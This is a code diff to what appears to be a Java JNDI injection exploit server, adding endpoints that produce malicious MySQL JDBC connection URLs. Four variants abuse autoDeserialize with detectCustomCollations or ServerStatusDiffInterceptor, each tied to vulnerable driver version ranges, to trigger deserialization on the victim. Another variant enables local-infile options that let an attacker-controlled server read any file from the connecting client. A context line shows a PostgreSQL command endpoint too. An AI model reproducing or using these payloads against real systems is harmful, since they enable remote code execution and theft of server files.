@@ -16,6 +16,58 @@ import java.util.Properties;
 
 @JNDIController
 public class DatabaseController implements Controller {
+    @JNDIMapping("/MySQL/Deserialize{n}/{host}/{port}/{user}")
+    public Properties mysqlDeserialize(String n, String host, String port, String user) throws Exception {
+        System.out.println("[MySQL] [Deserialize] Host: " + host + " Port: " + port + " User: " + user);
+        String url;
+
+        // 反序列化
+        switch (n) {
+            case "1":
+                // detectCustomCollations
+                // 5.1.19-5.1.48, 6.0.2-6.0.6
+                url = "jdbc:mysql://" + host + ":" + port + "/test?detectCustomCollations=true&autoDeserialize=true&user=" + user;
+                break;
+            case "2":
+                // ServerStatusDiffInterceptor
+                // 5.1.11-5.1.48
+                url = "jdbc:mysql://" + host + ":" + port + "/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=" + user;
+                break;
+            case "3":
+                // ServerStatusDiffInterceptor
+                // 6.0.2-6.0.6
+                url = "jdbc:mysql://" + host + ":" + port + "/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=" + user;
+                break;
+            case "4":
+                // ServerStatusDiffInterceptor
+                // 8.0.7-8.0.19
+                url = "jdbc:mysql://" + host + ":" + port + "/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=" + user;
+                break;
+            default:
+                throw new Exception("Unknown MySQL payload");
+        }
+
+        Properties props = new Properties();
+        props.setProperty("driver", "com.mysql.jdbc.Driver"); // 高版本 MySQL 驱动 jar 仍然保留了这个类以确保兼容性
+        props.setProperty("url", url);
+
+        return props;
+    }
+
+    @JNDIMapping("/MySQL/FileRead/{host}/{port}/{user}")
+    public Properties mysqlFileRead(String host, String port, String user) {
+        System.out.println("[MySQL] [FileRead] Host: " + host + " Port: " + port + " User: " + user);
+
+        // 客户端任意文件读取 (全版本)
+        String url = "jdbc:mysql://" + host + ":" + port + "/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360&user=" + user;
+
+        Properties props = new Properties();
+        props.setProperty("driver", "com.mysql.jdbc.Driver"); // 高版本 MySQL 驱动 jar 仍然保留了这个类以确保兼容性
+        props.setProperty("url", url);
+
+        return props;
+    }
+
     @JNDIMapping("/PostgreSQL/Command/{cmd}")
     public Properties postgresqlCommand(String cmd) {
         System.out.println("[PostgreSQL] Cmd: " + cmd);
